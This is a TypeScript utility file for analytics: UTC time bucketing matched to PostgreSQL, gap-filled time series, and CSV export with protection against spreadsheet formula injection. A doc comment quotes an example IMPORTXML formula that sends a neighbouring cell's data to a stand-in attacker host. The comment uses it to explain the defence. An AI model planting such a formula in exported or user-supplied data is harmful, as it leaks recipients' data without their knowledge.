import { Granularity } from './dto';

/**
 * Pure, side-effect-free helpers for analytics aggregation.
 *
 * All time bucketing is done in UTC so it lines up with PostgreSQL
 * `date_trunc(unit, ts)` over `timestamptz` columns (which truncates in the
 * session timezone — UTC by default). Keeping the JS gap-filling logic in the
 * same timezone guarantees the buckets the SQL produces map 1:1 onto the
 * buckets we enumerate here.
 */

/** Round a number to 2 decimal places (avoids float dust like 33.33333). */
export function round2(value: number): number {
  return Math.round(value * 100) / 100;
}

/**
 * Percentage of `part` out of `whole`, rounded to 2 decimals.
 * Returns 0 when `whole` is 0 — analytics never divides by zero.
 */
export function pct(part: number, whole: number): number {
  if (!whole || whole <= 0) return 0;
  return round2((part / whole) * 100);
}

/** Convert a rupee amount (Prisma Decimal -> number) to integer paise. */
export function rupeesToPaise(rupees: number): number {
  return Math.round(rupees * 100);
}

/** Map an application Granularity to a PostgreSQL `date_trunc` unit. */
export function granularityToSqlUnit(granularity: Granularity): string {
  switch (granularity) {
    case Granularity.HOUR:
      return 'hour';
    case Granularity.WEEK:
      return 'week';
    case Granularity.MONTH:
      return 'month';
    case Granularity.DAY:
    default:
      return 'day';
  }
}

/** Truncate a date to the start of its bucket, in UTC. */
export function truncateToBucket(date: Date, granularity: Granularity): Date {
  const d = new Date(date.getTime());

  switch (granularity) {
    case Granularity.HOUR:
      d.setUTCMinutes(0, 0, 0);
      return d;

    case Granularity.WEEK: {
      // Postgres date_trunc('week') anchors on Monday.
      d.setUTCHours(0, 0, 0, 0);
      const day = d.getUTCDay(); // 0=Sun .. 6=Sat
      const diffToMonday = (day + 6) % 7; // Mon->0, Sun->6
      d.setUTCDate(d.getUTCDate() - diffToMonday);
      return d;
    }

    case Granularity.MONTH:
      d.setUTCDate(1);
      d.setUTCHours(0, 0, 0, 0);
      return d;

    case Granularity.DAY:
    default:
      d.setUTCHours(0, 0, 0, 0);
      return d;
  }
}

/** Advance a bucket-start date by one bucket, in UTC. */
export function stepBucket(bucketStart: Date, granularity: Granularity): Date {
  const d = new Date(bucketStart.getTime());

  switch (granularity) {
    case Granularity.HOUR:
      d.setUTCHours(d.getUTCHours() + 1);
      return d;
    case Granularity.WEEK:
      d.setUTCDate(d.getUTCDate() + 7);
      return d;
    case Granularity.MONTH:
      d.setUTCMonth(d.getUTCMonth() + 1);
      return d;
    case Granularity.DAY:
    default:
      d.setUTCDate(d.getUTCDate() + 1);
      return d;
  }
}

/**
 * Enumerate every bucket-start between `from` and `to` (inclusive of the bucket
 * containing `to`). Guards against runaway loops with a hard cap.
 */
export function enumerateBuckets(
  from: Date,
  to: Date,
  granularity: Granularity,
): Date[] {
  const buckets: Date[] = [];
  let cursor = truncateToBucket(from, granularity);
  const end = to.getTime();
  const MAX_BUCKETS = 5000; // ~13 months of hourly buckets

  while (cursor.getTime() <= end && buckets.length < MAX_BUCKETS) {
    buckets.push(new Date(cursor.getTime()));
    cursor = stepBucket(cursor, granularity);
  }

  return buckets;
}

export interface BucketRow {
  bucket: Date;
  value: number;
}

export interface TimeSeriesPoint {
  date: string;
  value: number;
}

/**
 * Build a continuous time series: every bucket in the range appears exactly
 * once, with 0 filled where the database returned no rows. This is what turns
 * sparse aggregate rows into a chart-ready series with no gaps.
 */
export function fillTimeSeries(
  from: Date,
  to: Date,
  granularity: Granularity,
  rows: BucketRow[],
): TimeSeriesPoint[] {
  const byBucket = new Map<number, number>();
  for (const row of rows) {
    const key = truncateToBucket(row.bucket, granularity).getTime();
    byBucket.set(key, (byBucket.get(key) ?? 0) + row.value);
  }

  return enumerateBuckets(from, to, granularity).map((bucketStart) => ({
    date: bucketStart.toISOString(),
    value: round2(byBucket.get(bucketStart.getTime()) ?? 0),
  }));
}

/**
 * Characters that make Excel, LibreOffice and Sheets treat a cell as a formula
 * rather than text. Leading tab and CR are included because both are stripped
 * on import, exposing whatever follows them.
 */
const FORMULA_TRIGGERS = ['=', '+', '-', '@', '\t', '\r'];

/**
 * Neutralise a spreadsheet formula in a *string* cell by prefixing an
 * apostrophe, which every major spreadsheet reads as "the rest is literal text"
 * and does not display.
 *
 * RFC 4180 quoting is not protection: Excel evaluates `"=1+1"` exactly as it
 * evaluates `=1+1`. Without this, a value like
 * `=IMPORTXML("https://attacker/?d="&A2,"//a")` in an exported cell runs when
 * the recipient opens the file, and exfiltrates the row next to it. The staff
 * export carries member names, which any invited team member sets themselves,
 * so the payload and the reader are on opposite sides of a trust boundary.
 *
 * Only strings are considered: numeric cells are produced by this codebase, not
 * by users, and prefixing them would turn a legitimate negative number into
 * text.
 */
function neutralizeFormula(value: string | number | boolean | null): string | number | boolean | null {
  if (typeof value !== 'string' || value.length === 0) return value;
  return FORMULA_TRIGGERS.includes(value[0] as string) ? `'${value}` : value;
}

/**
 * Render rows of primitives as RFC 4180 CSV (CRLF line endings, values
 * containing a comma/quote/newline are quoted and internal quotes doubled).
 * Column order follows the keys of the first row. String cells that would be
 * read as formulas are neutralised — see {@link neutralizeFormula}.
 */
export function toCsv(rows: Record<string, string | number | boolean | null>[]): string {
  if (rows.length === 0) return '';

  const headers = Object.keys(rows[0] as Record<string, unknown>);
  const escape = (raw: string | number | boolean | null): string => {
    const value = neutralizeFormula(raw);
    const str = value === null || value === undefined ? '' : String(value);
    return /[",\r\n]/.test(str) ? `"${str.replace(/"/g, '""')}"` : str;
  };

  const lines = [headers.map((h) => escape(h)).join(',')];
  for (const row of rows) {
    lines.push(headers.map((h) => escape(row[h] ?? null)).join(','));
  }
  return lines.join('\r\n');
}
